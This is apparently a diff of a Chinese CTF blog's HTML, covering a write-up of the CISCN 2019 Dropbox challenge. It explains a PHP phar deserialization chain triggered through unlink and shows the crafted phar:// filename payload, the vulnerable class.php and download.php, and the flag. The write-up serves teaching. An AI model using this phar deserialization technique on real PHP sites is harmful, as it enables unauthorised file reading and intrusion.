+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>   phar 靠文件头识别，不靠扩展名
 </span></code></pre></div>
 <p><strong>上传 <code>x.jpg</code>，然后在删除时抓包，把 filename 改成：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>phar://x.jpg/test.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>phar://x.jpg/test.txt
 </span></code></pre></div>
 <p><strong>放包 → flag 出来：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>CTF2{0a2d4b76-7414-4da9-8d0a-2cfb19f333c0}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>CTF2{0a2d4b76-7414-4da9-8d0a-2cfb19f333c0}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>功能点一遍 → 上传没回显地址（上传洞死）
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>  → 下载/删除都收文件名 → 任意文件下载
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>    → 把 5 个 php 全抓下来
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>      → class.php 里有 file_get_contents（能读 flag）
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>        → 但整站没有 unserialize
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>          → 想到 phar：只要文件系统函数收到 phar:// 就会反序列化
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>            → download.php 过滤了 flag
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>              → delete.php 的 unlink 在受影响列表里 ✓
-</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>                → 倒推链：User::__destruct → FileList::__call → File::close
-</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>                  → 构造 phar → 改后缀上传 → 删除时改 filename → flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>功能点一遍 → 上传没回显地址（上传洞死）
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  → 下载/删除都收文件名 → 任意文件下载
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    → 把 5 个 php 全抓下来
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      → class.php 里有 file_get_contents（能读 flag）
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        → 但整站没有 unserialize
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>          → 想到 phar：只要文件系统函数收到 phar:// 就会反序列化
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>            → download.php 过滤了 flag
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>              → delete.php 的 unlink 在受影响列表里 ✓
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>                → 倒推链：User::__destruct → FileList::__call → File::close
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>                  → 构造 phar → 改后缀上传 → 删除时改 filename → flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_4">漏洞原理</a></h4>
 <p><strong>① phar 的本质</strong></p>
@@ -4470,10 +4661,10 @@
 <p><strong>而「解析 phar 文件」这件事，发生在</strong>任何<strong>接受路径的文件系统函数收到 <code>phar://</code> 开头的字符串时 —— 包括 <code>unlink</code>、<code>file_exists</code>、<code>stat</code>、<code>getimagesize</code> 等等。</strong></p>
 <p><strong>所以</strong>不需要 <strong><code>unserialize()</code> 这个函数</strong>，只要有「我能控制的路径」+「一个文件系统函数」，就能触发。**</p>
 <p><strong>③ 链的设计思路</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>先找终点（能读写文件的语句）
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>  → 再找入口（能被外部触发的魔术方法）
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>    → 中间用「动态调用」「属性可控」把它们接起来
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>      → 最后别忘了：读到了 ≠ 输出了
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>先找终点（能读写文件的语句）
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>  → 再找入口（能被外部触发的魔术方法）
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>    → 中间用「动态调用」「属性可控」把它们接起来
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>      → 最后别忘了：读到了 ≠ 输出了
 </span></code></pre></div>
 <hr />
 <h3 id="_5"><a class="toclink" href="../../ciscn2019-dropbox-phar/#_5">关键知识点</a></h3>
@@ -4526,61 +4717,61 @@
 <hr />
 <details class="note">
 <summary>class.php（按截图整理）</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>    <span class="k">public</span> <span class="nv">$db</span><span class="p">;</span>
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>    <span class="p">}</span>
-</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="p">}</span>
-</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>
-</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
-</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
-</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a>        <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
-</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a>    <span class="p">}</span>
-</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">detele</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a>        <span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
-</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>    <span class="p">}</span>
-</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a><span class="p">}</span>
-</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a>
-</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a><span class="k">class</span> <span class="nc">FileList</span> <span class="p">{</span>
-</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a>    <span class="k">private</span> <span class="nv">$files</span><span class="p">;</span>
-</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a>    <span class="k">private</span> <span class="nv">$results</span><span class="p">;</span>
-</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a>    <span class="k">private</span> <span class="nv">$funcs</span><span class="p">;</span>
-</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a>        <span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
-</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a>        <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s1">'/flag.txt'</span><span class="p">;</span>
-</span><span id="__span-32-26"><a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
-</span><span id="__span-32-27"><a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-</span><span id="__span-32-28"><a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
-</span><span id="__span-32-29"><a id="__codelineno-32-29" name="__codelineno-32-29" href="#__codelineno-32-29"></a>    <span class="p">}</span>
-</span><span id="__span-32-30"><a id="__codelineno-32-30" name="__codelineno-32-30" href="#__codelineno-32-30"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-32-31"><a id="__codelineno-32-31" name="__codelineno-32-31" href="#__codelineno-32-31"></a>        <span class="nb">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span><span class="p">,</span> <span class="nv">$func</span><span class="p">);</span>
-</span><span id="__span-32-32"><a id="__codelineno-32-32" name="__codelineno-32-32" href="#__codelineno-32-32"></a>        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-32-33"><a id="__codelineno-32-33" name="__codelineno-32-33" href="#__codelineno-32-33"></a>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span><span class="p">[</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">()][</span><span class="nv">$func</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">();</span>
-</span><span id="__span-32-34"><a id="__codelineno-32-34" name="__codelineno-32-34" href="#__codelineno-32-34"></a>        <span class="p">}</span>
-</span><span id="__span-32-35"><a id="__codelineno-32-35" name="__codelineno-32-35" href="#__codelineno-32-35"></a>    <span class="p">}</span>
-</span><span id="__span-32-36"><a id="__codelineno-32-36" name="__codelineno-32-36" href="#__codelineno-32-36"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
-</span><span id="__span-32-37"><a id="__codelineno-32-37" name="__codelineno-32-37" href="#__codelineno-32-37"></a>        <span class="c1">// 输出 results</span>
-</span><span id="__span-32-38"><a id="__codelineno-32-38" name="__codelineno-32-38" href="#__codelineno-32-38"></a>    <span class="p">}</span>
-</span><span id="__span-32-39"><a id="__codelineno-32-39" name="__codelineno-32-39" href="#__codelineno-32-39"></a><span class="p">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="k">class</span> <span class="nc">User</span> <span class="p">{</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>    <span class="k">public</span> <span class="nv">$db</span><span class="p">;</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>    <span class="p">}</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="p">}</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">close</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>        <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>    <span class="p">}</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">detele</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>        <span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>    <span class="p">}</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="p">}</span>
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="k">class</span> <span class="nc">FileList</span> <span class="p">{</span>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>    <span class="k">private</span> <span class="nv">$files</span><span class="p">;</span>
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a>    <span class="k">private</span> <span class="nv">$results</span><span class="p">;</span>
+</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>    <span class="k">private</span> <span class="nv">$funcs</span><span class="p">;</span>
+</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>        <span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
+</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>        <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">filename</span> <span class="o">=</span> <span class="s1">'/flag.txt'</span><span class="p">;</span>
+</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>    <span class="p">}</span>
+</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a>        <span class="nb">array_push</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">funcs</span><span class="p">,</span> <span class="nv">$func</span><span class="p">);</span>
+</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a>        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">results</span><span class="p">[</span><span class="nv">$file</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">()][</span><span class="nv">$func</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="nv">$func</span><span class="p">();</span>
+</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>        <span class="p">}</span>
+</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>    <span class="p">}</span>
+</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a>        <span class="c1">// 输出 results</span>
+</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a>    <span class="p">}</span>
+</span><span id="__span-15-39"><a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a><span class="p">}</span>
 </span></code></pre></div>
 </details>
 <details class="note">
 <summary>download.php（按截图整理）</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'sandbox'</span><span class="p">]);</span>
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">stristr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">"flag"</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>    <span class="nx">Header</span><span class="p">(</span><span class="s2">"Content-type: application/octet-stream"</span><span class="p">);</span>
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>    <span class="nx">Header</span><span class="p">(</span><span class="s2">"Content-Disposition: attachment; filename="</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>    <span class="k">echo</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
-</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>    <span class="k">echo</span> <span class="s2">"File not exist"</span><span class="p">;</span>
-</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="p">}</span>
-</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'sandbox'</span><span class="p">]);</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="nv">$file</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">40</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">stristr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">"flag"</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    <span class="nx">Header</span><span class="p">(</span><span class="s2">"Content-type: application/octet-stream"</span><span class="p">);</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>    <span class="nx">Header</span><span class="p">(</span><span class="s2">"Content-Disposition: attachment; filename="</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>    <span class="k">echo</span> <span class="nv">$file</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>    <span class="k">echo</span> <span class="s2">"File not exist"</span><span class="p">;</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="p">}</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
     
@@ -5581,112 +5772,6 @@
 </span></code></pre></div>
 <p>这一招专门用于绕过"禁止空字节"的过滤器，记进反序列化专题。</p>
 </div>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="./" class="md-meta__link">反序列化</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="2019-php"><a class="toclink" href="../../geek2019-php/">[极客大挑战 2019] PHP</a></h2>
-<p>这道题点进去后，它说有做备份的习惯。查看源代码没啥东西后，使用 dirsearch 开始扫：</p>
-<p><img alt="dirsearch 扫描结果" src="../../../assets/images/geek2019-php/01-dirsearch.png" /></p>
-<p>发现了 <code>www.zip</code>，下载下来后发现了几个源代码，一个一个查看。</p>
-<h3 id="flagphp"><a class="toclink" href="../../geek2019-php/#flagphp">先看 flag.php</a></h3>
-<p>里面的 flag 是假的。</p>
-<h3 id="indexphp"><a class="toclink" href="../../geek2019-php/#indexphp">再看 index.php</a></h3>
-<p>审计发现了参数是 <code>select</code>：</p>
-<p><img alt="index.php" src="../../../assets/images/geek2019-php/02-index.png" /></p>
